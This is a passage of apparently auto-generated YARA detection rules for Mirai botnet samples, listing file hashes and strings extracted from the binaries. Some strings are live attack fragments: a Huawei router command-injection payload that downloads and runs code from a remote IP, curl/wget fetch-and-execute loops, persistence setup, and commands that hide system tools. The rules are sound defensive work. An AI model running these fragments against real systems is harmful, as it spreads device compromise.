      hash35 = "5a1d91831955900ce61ac7df64647bd67396329f246a22e104f9ddd9ecf7dc57"
      hash36 = "5d9434fc00c92e10bcf72fdce59c9546ee52d60df8ac5af9d525f25404576b98"
      hash37 = "653980e4216d4bf61bde99f32cee0481d0628eb8dccd70c5e2aead820eebf446"
      hash38 = "654826d8630bf9b3276e8c6ba79635a793efd946cd99df89f6e2cc52917bde1c"
      hash39 = "67036276b4fbe0afd07661cd49c3ce727a84141c77684d520f47a95323d59dbd"
      hash40 = "6a5af377c1edc2ad608b197a0d6549650ad693230e678812a1e97bc6ffc5bf5e"
   strings:
      $s1 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s3 = "getpid.c" fullword ascii /* score: '9.00'*/
      $s4 = "__GI_getc_unlocked" fullword ascii /* score: '9.00'*/
      $s5 = "getgid.c" fullword ascii /* score: '9.00'*/
      $s6 = "__GI_geteuid" fullword ascii /* score: '9.00'*/
      $s7 = "getuid.c" fullword ascii /* score: '9.00'*/
      $s8 = "getegid.c" fullword ascii /* score: '9.00'*/
      $s9 = "tcgetattr.c" fullword ascii /* score: '9.00'*/
      $s10 = "fgets_unlocked" fullword ascii /* score: '9.00'*/
      $s11 = "fgetc_unlocked.c" fullword ascii /* score: '9.00'*/
      $s12 = "fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s13 = "__GI_tcgetattr" fullword ascii /* score: '9.00'*/
      $s14 = "__GI_fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s15 = "__fgetc_unlocked" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__32ac2cc4_Mirai_signature__421688ae_Mirai_signature__4afabac3_Mirai_signature__589f3920_9 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_32ac2cc4.elf, Mirai(signature)_421688ae.elf, Mirai(signature)_4afabac3.elf, Mirai(signature)_589f3920.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "32ac2cc47e06558204030a88dc64b3f8b2ad024f7e7d95082de0bf7efd7cb7fc"
      hash2 = "421688aeb7a85e68e7cd6cdf36c34039a01c2d51a266b66f8d4d93cdad12bd0a"
      hash3 = "4afabac36401a8e799ec775086c6ec86a5309f9226deb3bd39505ffffefe3345"
      hash4 = "589f3920e6d5da2b5131434a428c0aa1bf6631e883372f4b9f3d1b9b9a3efa7b"
   strings:
      $s1 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s3 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s5 = "__make_stacks_executable" fullword ascii /* score: '12.00'*/
      $s6 = "pthread_getspecific.c" fullword ascii /* score: '12.00'*/
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc" fullword ascii /* score: '11.00'*/
      $s8 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/unwind-c.c" fullword ascii /* score: '11.00'*/
      $s9 = "pthread_key_create.c" fullword ascii /* score: '10.00'*/
      $s10 = "_thread_db_pthread_key_struct_seq" fullword ascii /* score: '10.00'*/
      $s11 = "_thread_db_pthread_key_data_data" fullword ascii /* score: '10.00'*/
      $s12 = "_thread_db_pthread_report_events" fullword ascii /* score: '10.00'*/
      $s13 = "_thread_db_pthread_key_struct_destr" fullword ascii /* score: '10.00'*/
      $s14 = "_thread_db_pthread_key_data_seq" fullword ascii /* score: '10.00'*/
      $s15 = "_thread_db___pthread_keys" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__253adc3b_Mirai_signature__38e02ed8_Mirai_signature__5a1d9183_10 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_253adc3b.elf, Mirai(signature)_38e02ed8.elf, Mirai(signature)_5a1d9183.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "253adc3bb48435122f8c3f39580b29c3ad66b88e1ac98e52420abf39bdbbba4e"
      hash2 = "38e02ed85d0f7629e13f54489a430681477fd9694f35d4e864cf616708261372"
      hash3 = "5a1d91831955900ce61ac7df64647bd67396329f246a22e104f9ddd9ecf7dc57"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.00'*/
      $s2 = " -g 92.113.147.23 -l /tmp/kh -r /mips; /bin/busybox chmod 777 * /tmp/kh; /tmp/kh huawei)</NewStatusURL><NewDownloadURL>$(echo HU" ascii /* score: '30.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                      ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
      $s7 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                         ' */ /* score: '24.00'*/
      $s8 = "cyppsxe20t3pu2m8bl88qsyd6uhhl22onwrjn76gs9tad69ms27q7a5knzmcfaj489791cmdwjfveeij9efmoieks6ob1t8eviul7z6fuhq1nkr6jn4piqisqxmabl4o" ascii /* score: '18.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s11 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s12 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)" fullword ascii /* score: '15.00'*/
      $s13 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s14 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)" fullword ascii /* score: '12.00'*/
      $s15 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__35f39562_Mirai_signature__43ba2002_Mirai_signature__5003c8b4_Mirai_signature__5e83a80b_11 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_35f39562.elf, Mirai(signature)_43ba2002.elf, Mirai(signature)_5003c8b4.elf, Mirai(signature)_5e83a80b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "35f395627a040abafb23f6eec061b19ff9fe30a3f9edae946d1c2327e8eb2594"
      hash2 = "43ba20024f36c6e572698f81e980efd90fb8a947ccc9568d4b6526c4c214c782"
      hash3 = "5003c8b45b6876942ac8a96d3d7df838fba86123fd600fc0441dff86b77be748"
      hash4 = "5e83a80be5f02729f05973d0862b0753a0ebe61d78fe76eaec589b8abeacaf46"
   strings:
      $s1 = "GET /?%s%d HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s2 = "test@example.com" fullword ascii /* score: '18.00'*/
      $s3 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" fullword ascii /* score: '17.00'*/
      $s4 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" fullword ascii /* score: '17.00'*/
      $s5 = "/proxy.txt" fullword ascii /* score: '14.00'*/
      $s6 = "/downloads/brochure.pdf" fullword ascii /* score: '13.00'*/
      $s7 = "/assets/images/logo.png" fullword ascii /* score: '12.00'*/
      $s8 = "/login" fullword ascii /* score: '12.00'*/
      $s9 = "/wp-content/uploads/2023/" fullword ascii /* score: '11.00'*/
      $s10 = "Warning: Failed to load proxies, continuing with direct connections" fullword ascii /* score: '10.00'*/
      $s11 = "Product description text" fullword ascii /* score: '10.00'*/
      $s12 = "200 Connection established" fullword ascii /* score: '9.00'*/
      $s13 = "\"Opera\";v=\"107\", \"Chromium\";v=\"121\", \"Not?A_Brand\";v=\"24\"" fullword ascii /* score: '9.00'*/
      $s14 = "This is a test message with some content" fullword ascii /* score: '9.00'*/
      $s15 = "\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__27cbf20e_Mirai_signature__35f39562_Mirai_signature__3c1f8a07_Mirai_signature__43ba2002_Mirai_signature__46_12 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_27cbf20e.elf, Mirai(signature)_35f39562.elf, Mirai(signature)_3c1f8a07.elf, Mirai(signature)_43ba2002.elf, Mirai(signature)_46645355.elf, Mirai(signature)_4a7822f1.elf, Mirai(signature)_4afabac3.elf, Mirai(signature)_5003c8b4.elf, Mirai(signature)_5425f5a3.elf, Mirai(signature)_5e83a80b.elf, Mirai(signature)_66df8c92.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "27cbf20e47f3b5e974e7528ef90d1985311b4e598cc5a8700ee9259d56d9fe24"
      hash2 = "35f395627a040abafb23f6eec061b19ff9fe30a3f9edae946d1c2327e8eb2594"
      hash3 = "3c1f8a07291f0ac25e35a4a659a95cc2fdceba7b722be84600a904368e188433"
      hash4 = "43ba20024f36c6e572698f81e980efd90fb8a947ccc9568d4b6526c4c214c782"
      hash5 = "46645355a0ebd219ba433ee099cb4f044d59d1257d804b1e740cb9988ab96769"
      hash6 = "4a7822f12e54a5dc79e7fac4a6073461177a7e51f6963077483dd46e90867903"
      hash7 = "4afabac36401a8e799ec775086c6ec86a5309f9226deb3bd39505ffffefe3345"
      hash8 = "5003c8b45b6876942ac8a96d3d7df838fba86123fd600fc0441dff86b77be748"
      hash9 = "5425f5a34e61ffbe876966b0a139c818bd48f0b87465e0d50716625cd44f4a54"
      hash10 = "5e83a80be5f02729f05973d0862b0753a0ebe61d78fe76eaec589b8abeacaf46"
      hash11 = "66df8c92290d8f74324f289cd60bb9fbf6aa20aac78c02becf583b3fad2c9a73"
   strings:
      $s1 = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s2 = "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s5 = "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__264370b8_Mirai_signature__26f251ca_Mirai_signature__2ee9a42c_Mirai_signature__37e39ec8_Mirai_signature__3f_13 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_264370b8.elf, Mirai(signature)_26f251ca.elf, Mirai(signature)_2ee9a42c.elf, Mirai(signature)_37e39ec8.elf, Mirai(signature)_3faf4357.elf, Mirai(signature)_3fb73ed9.elf, Mirai(signature)_4dcdbd21.elf, Mirai(signature)_551cbc16.elf, Mirai(signature)_56ca29b1.elf, Mirai(signature)_572b6ab3.elf, Mirai(signature)_5b18c9cb.elf, Mirai(signature)_61c23c33.elf, Mirai(signature)_6407da13.elf, Mirai(signature)_68f89833.elf, Mirai(signature)_6bfe1ef9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "264370b846197763bef4997522caa5baad2628f61d1da509d405038a45b91e1c"
      hash2 = "26f251ca933cc3dedacea77772e89d86633c93a824f4cb3a9f7461cd0becee94"
      hash3 = "2ee9a42c7da356fc65fa94d18094ec12d967536a76a053437870646f3d0667f5"
      hash4 = "37e39ec80792fb487504db381da4cbebe9737e6cc1ca2af95542483567ed1256"
      hash5 = "3faf435798bf284f72555578d9c55674772ad2d80ef3ed791ee0f0b3a59a1a1f"
      hash6 = "3fb73ed97b6102825b24e6986148d5c1ab447d681a0bf72c7f4e47f01300932e"
      hash7 = "4dcdbd21914f34f1c0b2a323da5a6840e7665ed56dc18b43a1638b721a1c2248"
      hash8 = "551cbc1698d7e07b9e00c4443098449f0a5ef09e14e7d861b757e853f77fe671"
      hash9 = "56ca29b158fe145953ba0165b56af3b0e533b8b155581e37174037abea8f3c60"
      hash10 = "572b6ab3c9095f00741c6c2f86f1d477fad4bb568b6cc4ac6ad8d7e42353cbbf"
      hash11 = "5b18c9cbe6bccec88732d23ce39ba1d863cb8487cb0c557cbbd169b9f61e886f"
      hash12 = "61c23c332c5f8e1952f0343471cd43b4b2c3376e591835dcd1c547702dcc8594"
      hash13 = "6407da1321eb83154352e38a25826d58e1a503da2fb67a201025b60b0957d388"
      hash14 = "68f89833bf74c49260c19d9369124cd173373e5e493fae27be88ba788aac8613"
      hash15 = "6bfe1ef9772b6e98ce59df39a922e07ec789e8a629f38eed755aaa7e74382802"
   strings:
      $s1 = "        rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s2 = "          rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s3 = "      rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s4 = "WantedBy=multi-user.target default.target" fullword ascii /* score: '17.00'*/
      $s5 = "After=network.target multi-user.target" fullword ascii /* score: '17.00'*/
      $s6 = "    for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 -O" ascii /* score: '15.00'*/
      $s7 = "      for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 " ascii /* score: '15.00'*/
      $s8 = "    for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 -O" ascii /* score: '15.00'*/
      $s9 = "ps | grep uraskid | grep -v grep > /dev/null 2>&1 || %s skidstart &" fullword ascii /* score: '15.00'*/
      $s10 = "      for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 " ascii /* score: '15.00'*/
      $s11 = "systemctl enable %s.service 2>/dev/null" fullword ascii /* score: '13.00'*/
      $s12 = "        chmod +x \"$TEMP_SCRIPT\" && sh \"$TEMP_SCRIPT\" >/dev/null 2>&1 &" fullword ascii /* score: '12.00'*/
      $s13 = "        TEMP_SCRIPT=\"/tmp/.s$$\"" fullword ascii /* score: '12.00'*/
      $s14 = "#!/bin/sh /etc/rc.common" fullword ascii /* score: '12.00'*/
      $s15 = "      TEMP_SCRIPT=\"/tmp/.s$$\"" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__1d600e2d_Mirai_signature__25d4d387_Mirai_signature__2f52dc2e_Mirai_signature__435e67c0_Mirai_signature__4c_14 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1d600e2d.elf, Mirai(signature)_25d4d387.elf, Mirai(signature)_2f52dc2e.elf, Mirai(signature)_435e67c0.elf, Mirai(signature)_4ccabe30.elf, Mirai(signature)_5245c572.elf, Mirai(signature)_5c9d399b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d600e2d91d8c36e90d1ed7361dad751ad8f5e859bce7302fc569c7559df0557"
      hash2 = "25d4d38704efbf607cc3bab7eefa61839fe7bd31da204689b0a2b665235e362e"
      hash3 = "2f52dc2e2d937a2cfe6ec241f8c740ee59518cf7accf6a9770efe66b39b408f6"
      hash4 = "435e67c0fcb0ac34b17754527f264833553ada8fa222aa37a0841b3faf6324a5"
      hash5 = "4ccabe30fdb66f602194145df2a695093bf4cfa44a4903075ae6999e59903922"
      hash6 = "5245c572b41cb1257c070a75fa2fb6625c3d699172f89306aadd2bd32843546d"
      hash7 = "5c9d399baaf6b4020909a3b8c97f61fa09846b9b27fc0882d4c8fa362042385a"
   strings:
      $s1 = "hexdump" fullword ascii /* score: '18.00'*/
      $s2 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s3 = "/usr/lib/systemd/system/reboot.target" fullword ascii /* score: '17.00'*/
      $s4 = "/etc/systemd/system/reboot.target" fullword ascii /* score: '17.00'*/
      $s5 = "  4) echo 'Fatal error: User is a script kiddie';;" fullword ascii /* score: '16.00'*/
      $s6 = "for c in ps kill grep ls cat readlink mount umount awk sed cut wget curl top netstat ss lsof reboot shutdown halt poweroff; do m" ascii /* score: '15.00'*/
      $s7 = "for p in $(ps aux | grep '[%c]%s' | awk '{print $2}'); do   if [ $(stat -c %%X /proc/$p/stat 2>/dev/null || echo 0) -lt $(( $(da" ascii /* score: '14.00'*/
      $s8 = "  0) echo 'Command not found: Your skill level';;" fullword ascii /* score: '12.00'*/
      $s9 = "/tmp/$c /sbin/$c 2>/dev/null; mount --bind /tmp/$c /usr/sbin/$c 2>/dev/null; done" fullword ascii /* score: '11.00'*/
      $s10 = "kfifo /tmp/$c 2>/dev/null; mount --bind /tmp/$c /bin/$c 2>/dev/null; mount --bind /tmp/$c /usr/bin/$c 2>/dev/null; mount --bind " ascii /* score: '11.00'*/
      $s11 = "/sbin/service" fullword ascii /* score: '10.00'*/
      $s12 = "ftpput" fullword ascii /* score: '10.00'*/
      $s13 = "te +%%s) - 30 )) ]; then     kill -9 $p 2>/dev/null;   fi; done" fullword ascii /* score: '10.00'*/
      $s14 = "/usr/bin/service" fullword ascii /* score: '10.00'*/
      $s15 = "/usr/bin/systemctl" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__27cbf20e_Mirai_signature__3c1f8a07_Mirai_signature__46645355_Mirai_signature__4a7822f1_Mirai_signature__4a_15 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_27cbf20e.elf, Mirai(signature)_3c1f8a07.elf, Mirai(signature)_46645355.elf, Mirai(signature)_4a7822f1.elf, Mirai(signature)_4afabac3.elf, Mirai(signature)_5425f5a3.elf, Mirai(signature)_66df8c92.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "27cbf20e47f3b5e974e7528ef90d1985311b4e598cc5a8700ee9259d56d9fe24"
      hash2 = "3c1f8a07291f0ac25e35a4a659a95cc2fdceba7b722be84600a904368e188433"
      hash3 = "46645355a0ebd219ba433ee099cb4f044d59d1257d804b1e740cb9988ab96769"
      hash4 = "4a7822f12e54a5dc79e7fac4a6073461177a7e51f6963077483dd46e90867903"
      hash5 = "4afabac36401a8e799ec775086c6ec86a5309f9226deb3bd39505ffffefe3345"
      hash6 = "5425f5a34e61ffbe876966b0a139c818bd48f0b87465e0d50716625cd44f4a54"
      hash7 = "66df8c92290d8f74324f289cd60bb9fbf6aa20aac78c02becf583b3fad2c9a73"
   strings:
      $s1 = "Origin: https://www.bing.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.youtube.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.yahoo.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.netflix.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.reddit.com" fullword ascii /* score: '21.00'*/
      $s6 = "Referer: https://www.yahoo.com/" fullword ascii /* score: '17.00'*/
      $s7 = "Referer: https://www.youtube.com/" fullword ascii /* score: '17.00'*/
      $s8 = "Referer: https://www.bing.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.google.com/" fullword ascii /* score: '17.00'*/
      $s10 = "Referer: https://www.reddit.com/" fullword ascii /* score: '17.00'*/
      $s11 = "Referer: https://www.netflix.com/" fullword ascii /* score: '17.00'*/
      $s12 = "X-Forwarded-For: 192.168.1.1" fullword ascii /* score: '14.00'*/
      $s13 = "X-Forwarded-For: 203.0.113.1" fullword ascii /* score: '14.00'*/
      $s14 = "X-Forwarded-For: 127.0.0.1" fullword ascii /* score: '14.00'*/
      $s15 = "X-Forwarded-For: 172.16.0.1" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__1d5bb24e_Mirai_signature__1d600e2d_Mirai_signature__1ebc071c_Mirai_signature__1fd07b9a_Mirai_signature__20_16 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1d5bb24e.elf, Mirai(signature)_1d600e2d.elf, Mirai(signature)_1ebc071c.elf, Mirai(signature)_1fd07b9a.elf, Mirai(signature)_20523f26.elf, Mirai(signature)_21f9efb9.elf, Mirai(signature)_225624e5.elf, Mirai(signature)_22dc51a7.elf, Mirai(signature)_235e1bb9.elf, Mirai(signature)_24872075.elf, Mirai(signature)_251e7e86.elf, Mirai(signature)_25d4d387.elf, Mirai(signature)_264370b8.elf, Mirai(signature)_26f251ca.elf, Mirai(signature)_28711053.elf, Mirai(signature)_2aef512d.elf, Mirai(signature)_2be9ccee.elf, Mirai(signature)_2e9e4a16.elf, Mirai(signature)_2ee9a42c.elf, Mirai(signature)_2f52dc2e.elf, Mirai(signature)_3022317d.elf, Mirai(signature)_3079034e.elf, Mirai(signature)_355ff5d3.elf, Mirai(signature)_35f14e90.elf, Mirai(signature)_3654d22e.elf, Mirai(signature)_36bed451.elf, Mirai(signature)_36db9aab.elf, Mirai(signature)_36dd257b.elf, Mirai(signature)_37e39ec8.elf, Mirai(signature)_3c49de25.elf, Mirai(signature)_3f5c35be.elf, Mirai(signature)_3f957cc4.elf, Mirai(signature)_3faf4357.elf, Mirai(signature)_3fb73ed9.elf, Mirai(signature)_3fe6d5a3.elf, Mirai(signature)_4257f099.elf, Mirai(signature)_42f0f7da.elf, Mirai(signature)_435e67c0.elf, Mirai(signature)_44f5dc9b.elf, Mirai(signature)_45c211c1.elf, Mirai(signature)_4623d2ab.elf, Mirai(signature)_46f381b3.elf, Mirai(signature)_488a3964.elf, Mirai(signature)_4a117998.elf, Mirai(signature)_4c2b7fc7.elf, Mirai(signature)_4ccabe30.elf, Mirai(signature)_4d8d5b8a.elf, Mirai(signature)_4dcdbd21.elf, Mirai(signature)_51e85925.elf, Mirai(signature)_5245c572.elf, Mirai(signature)_537d2785.elf, Mirai(signature)_551cbc16.elf, Mirai(signature)_56ca29b1.elf, Mirai(signature)_572b6ab3.elf, Mirai(signature)_5943207f.elf, Mirai(signature)_5b18c9cb.elf, Mirai(signature)_5c9d399b.elf, Mirai(signature)_5ebf996d.elf, Mirai(signature)_5f343a4b.elf, Mirai(signature)_61c23c33.elf, Mirai(signature)_62098781.elf, Mirai(signature)_6407da13.elf, Mirai(signature)_6509f8d5.elf, Mirai(signature)_654d37fe.elf, Mirai(signature)_66b29d0b.elf, Mirai(signature)_66c7502f.elf, Mirai(signature)_674e4453.elf, Mirai(signature)_68b4d415.elf, Mirai(signature)_68f89833.elf, Mirai(signature)_6b36c951.elf, Mirai(signature)_6b469574.elf, Mirai(signature)_6bf02c0a.elf, Mirai(signature)_6bfe1ef9.elf, Mirai(signature)_6c7cb03c.elf, Mirai(signature)_6c9a81f9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5bb24e8127095d5e0a337be1a25339a75c4f2bd3522de8797549ed0710162e"
      hash2 = "1d600e2d91d8c36e90d1ed7361dad751ad8f5e859bce7302fc569c7559df0557"
      hash3 = "1ebc071c0427f1b7706c00d84940fde795b95d0f50500e4824694d7daccc5c80"
      hash4 = "1fd07b9ac091644e84c9bfd151c2dccf6be323decb096e4efb516de2ad170045"
      hash5 = "20523f266eee48ad6ac594280472c4c558ff62c513e4422e27e81addc750be3c"
      hash6 = "21f9efb992b4e1d1beaf3b3a479153277e86fdc1c00c2728a5fb4e212a2a4554"
      hash7 = "225624e52e0590cf79aa5a5daefb05011402d3ce80a6701107ff5175f5c7f7db"
      hash8 = "22dc51a72f5b30374a702a81c45af898ecabcf1e0ea28c46ff9e10533a6e071b"
      hash9 = "235e1bb98f0f295983321c223d4499bff7897f881b96920715868aed191f24f4"
      hash10 = "24872075ae9bbeed2ca56621780ac2dc6ff507e54126aeca86802681e339a8a7"
      hash11 = "251e7e866484d05293bbba6850511153f3855ffb47d8b70c3363e90171946ee2"
      hash12 = "25d4d38704efbf607cc3bab7eefa61839fe7bd31da204689b0a2b665235e362e"
      hash13 = "264370b846197763bef4997522caa5baad2628f61d1da509d405038a45b91e1c"
      hash14 = "26f251ca933cc3dedacea77772e89d86633c93a824f4cb3a9f7461cd0becee94"
      hash15 = "2871105351d88ac4920d898f61a3f71f3c5825a80244a8b7c207b9bb4919e082"
      hash16 = "2aef512df33be0b36a71e753fc6884bded09c40af4c2b6383737faed7911bc53"
      hash17 = "2be9ccee5bff062c276a0f95c010390dcdb21966e425e53948c24cafe85634fc"
      hash18 = "2e9e4a16603654d6da46bd1a4884fae72a5817fb772007a5e822cc5d63c43eb0"
